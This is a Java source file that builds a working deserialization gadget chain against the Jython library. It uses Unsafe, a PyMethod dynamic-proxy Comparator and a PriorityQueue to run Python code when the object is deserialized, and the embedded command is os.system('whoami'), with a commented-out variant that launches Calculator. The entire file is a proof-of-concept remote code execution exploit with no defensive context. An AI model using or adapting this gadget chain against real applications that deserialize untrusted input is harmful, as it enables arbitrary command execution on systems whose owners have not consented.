package gadget.jython;
import org.python.core.*;
import sun.misc.Unsafe;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.util.Comparator;
import java.util.HashMap;
import java.util.PriorityQueue;
public class PYCODE {
        public static void main(String[] args) throws Exception {
            Field unsafeField = Unsafe.class.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            Unsafe unsafe = (Unsafe) unsafeField.get(null);

            PyMethod pyMethod = (PyMethod) unsafe.allocateInstance(PyMethod.class);

            PyObject builtinFunctions = (PyObject) unsafe.allocateInstance(Class.forName("org.python.core.BuiltinFunctions"));

            Field index = builtinFunctions.getClass().getSuperclass().getDeclaredField("index");
            index.setAccessible(true);
            index.set(builtinFunctions, 18);

            pyMethod.__func__ = builtinFunctions;
            pyMethod.im_class = new PyString().getType();
            HashMap<Object, PyObject> _args = new HashMap<>();
            _args.put("rs", new PyString("__import__('os').system('whoami')"));
            //_args.put("rs", new PyString("import os;\nos.system('open -a /System/Applications/Calculator.app')"));

            PyStringMap locals = new PyStringMap(_args);
            Object[] queue = new Object[] {
                    new PyString("__import__('code').InteractiveInterpreter().runcode(rs)')"),
                    locals,
            };

            // create dynamic proxy
            Comparator o = (Comparator) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
                    new Class[]{Comparator.class},
                    pyMethod);

            // set comparator
            PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, o);

            Field f = priorityQueue.getClass().getDeclaredField("queue");
            f.setAccessible(true);
            f.set(priorityQueue, queue);
            Field f2 = priorityQueue.getClass().getDeclaredField("size");
            f2.setAccessible(true);
            f2.set(priorityQueue, 2);

            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(priorityQueue);

            byte[] bytes = byteArrayOutputStream.toByteArray();
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
            objectInputStream.readObject();
        }
    }
